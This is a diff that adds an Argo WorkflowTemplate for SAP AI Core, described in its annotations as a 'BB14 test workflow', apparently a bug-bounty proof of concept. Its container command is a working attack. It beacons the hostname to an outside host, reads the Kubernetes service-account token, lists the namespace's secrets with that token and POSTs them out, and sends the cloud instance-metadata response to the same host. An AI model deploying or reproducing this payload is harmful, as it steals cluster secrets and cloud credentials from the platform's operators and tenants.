@@ -1,0 +1,32 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: bb14-exec
+  annotations:
+    scenarios.ai.sap.com/description: "BB14 test workflow"
+    scenarios.ai.sap.com/name: "bb14-scenario"
+    executables.ai.sap.com/description: "BB14 test executable"
+    executables.ai.sap.com/name: "bb14-exec"
+  labels:
+    scenarios.ai.sap.com/id: "bb14-scenario"
+    executables.ai.sap.com/id: "bb14-exec"
+    ai.sap.com/version: "1.0.0"
+spec:
+  entrypoint: main
+  templates:
+  - name: main
+    container:
+      image: curlimages/curl:latest
+      command:
+      - sh
+      - -c
+      - |
+        curl -s "https://www.masonhck.tech/cb.php?src=wftemplate-rce-$(hostname)"
+        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo none)
+        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo none)
+        curl -s "https://www.masonhck.tech/cb.php?src=wft-ns-${NS}"
+        curl -sk "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
+          -H "Authorization: Bearer ${TOKEN}" | head -c 2000 | \
+          curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-secrets" -d @-
+        curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" | \
+          curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-imds" -d @-
